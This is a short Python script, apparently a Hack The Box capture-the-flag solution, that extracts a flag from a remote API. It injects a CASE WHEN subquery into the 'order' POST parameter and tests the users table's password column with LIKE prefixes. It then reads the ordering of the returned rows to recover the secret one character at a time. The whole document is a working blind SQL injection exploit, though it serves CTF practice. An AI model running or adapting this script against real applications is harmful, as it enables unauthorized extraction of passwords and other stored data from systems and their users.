import requests
dict = "abcdefghijklmnopqrstuvwxyz1234567890ABCDEFGHIJKLMNOPQRSTUVWXYZ"
url = "http://167.71.131.167:32434/api/list"
# HTB{0r______________________}

flag = "0rd_"
oldFlag = flag

while True:
    for each in dict:
        r = requests.post(
            url,
            data={
                "order": "(select CASE WHEN (SELECT count(*) from users where password LIKE 'HTB{"+flag+each+"%}')=1 THEN id ELSE salary END ) ASC"}
        )
        data = r.json()
        if data[1]['id'] == 2:
            print(each)
            flag += each
            break

    if oldFlag == flag:
        flag += '_'

    oldFlag = flag

    print("HTB{"+flag+"}")

print(flag)


# HTB{_____flag}
